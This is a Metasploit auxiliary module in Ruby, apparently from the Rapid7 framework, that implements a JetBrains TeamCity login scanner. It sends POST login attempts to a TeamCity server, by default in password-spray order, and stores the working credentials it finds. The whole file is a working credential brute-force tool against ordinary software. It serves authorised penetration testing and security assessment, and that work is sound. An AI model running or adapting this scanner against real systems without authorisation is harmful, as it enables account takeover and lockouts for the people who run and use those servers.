##
# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

require 'metasploit/framework/credential_collection'
require 'metasploit/framework/login_scanner/teamcity'

class MetasploitModule < Msf::Auxiliary
  include Msf::Auxiliary::Scanner
  include Msf::Auxiliary::AuthBrute
  include Msf::Exploit::Remote::HttpClient

  def initialize(info = {})
    super(
      update_info(
        info,
        'Name' => 'JetBrains TeamCity Login Scanner',
        'Description' => 'This module performs login attempts against a JetBrains TeamCity webpage to bruteforce possible credentials.',
        'Author' => [ 'adfoster-r7', 'sjanusz-r7' ],
        'License' => MSF_LICENSE,
        'Notes' => {
          'Stability' => [ CRASH_SAFE ],
          'Reliability' => [],
          'SideEffects' => [ IOC_IN_LOGS, ACCOUNT_LOCKOUTS ]
        }
      )
    )

    register_options(
      [
        Msf::OptString.new('TARGETURI', [true, 'The base path to the TeamCity application', '/']),
        Opt::RPORT(8111),
        OptBool.new('PASSWORD_SPRAY', [true, 'Reverse the credential pairing order. For each password, attempt every possible user.', true]),
      ], self.class
    )

    options_to_deregister = ['DOMAIN']
    deregister_options(*options_to_deregister)
  end

  def process_credential(credential_data)
    credential_combo = "#{credential_data[:username]}:#{credential_data[:private_data]}"
    case credential_data[:status]
    when Metasploit::Model::Login::Status::SUCCESSFUL
      print_good "#{credential_data[:address]}:#{credential_data[:port]} - Login Successful: #{credential_combo}"
      credential_core = create_credential(credential_data)
      credential_data[:core] = credential_core
      create_credential_login(credential_data)
      return { status: :success, credential: credential_data }
    else
      error_msg = "#{credential_data[:address]}:#{credential_data[:port]} - LOGIN FAILED: #{credential_combo} (#{credential_data[:status]})"
      vprint_error error_msg
      invalidate_login(credential_data)
      return { status: :fail, credential: credential_data }
    end
  end

  def run_scanner(scanner)
    successful_logins = []
    scanner.scan! do |result|
      credential_data = result.to_h
      credential_data.merge!(
        module_fullname: fullname,
        workspace_id: myworkspace_id
      )

      processed_credential = process_credential(credential_data)
      successful_logins << processed_credential[:credential] if processed_credential[:status] == :success
    end
    { successful_logins: successful_logins }
  end

  def run_host(ip)
    cred_collection = build_credential_collection(
      username: datastore['USERNAME'],
      password: datastore['PASSWORD']
    )

    scanner_opts = configure_http_login_scanner(
      host: ip,
      uri: target_uri,
      port: datastore['RPORT'],
      proxies: datastore['Proxies'],
      cred_details: cred_collection,
      stop_on_success: datastore['STOP_ON_SUCCESS'],
      bruteforce_speed: datastore['BRUTEFORCE_SPEED'],
      connection_timeout: datastore['HttpClientTimeout'] || 5,
      framework: framework,
      framework_module: self,
      http_success_codes: [200, 302],
      method: 'POST',
      ssl: datastore['SSL']
    )

    scanner = Metasploit::Framework::LoginScanner::Teamcity.new(scanner_opts)
    run_scanner(scanner)
  end
end
